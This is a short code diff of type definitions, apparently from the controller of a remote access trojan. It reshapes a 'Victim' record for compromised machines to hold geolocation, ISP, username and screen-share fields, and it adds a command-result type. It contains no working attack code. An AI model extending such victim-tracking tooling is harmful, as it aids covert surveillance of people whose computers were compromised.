@@ -6,19 +6,29 @@ type Victims = {
 };
 
 type Victim = {
-  System: string;
-  Version: string;
-  Architecture: string;
-  Name: string;
-  Processor: string;
-  Python: string;
-  User: string;
-  IPv4: string;
-  IPv6: string;
-  Uptime: string;
-  Privileges: string;
-  Bit: string;
-  "Rat-Ted-Version": string;
-  ID: string;
-  Current_Directory: string;
+  architecture: string;
+  city: string;
+  computer_name: string;
+  connection_type: string;
+  country: string;
+  id: number;
+  ip: string;
+  isp: string;
+  latitude: string;
+  longitude: string;
+  organization: string;
+  os: string;
+  postal: string;
+  region: string;
+  region_name: string;
+  screen_share_source: string;
+  socket_ip: string;
+  status: string;
+  timezone: string;
+  username: string;
+};
+
+type CommandResultType = {
+  result: string;
+  error: string;
 };
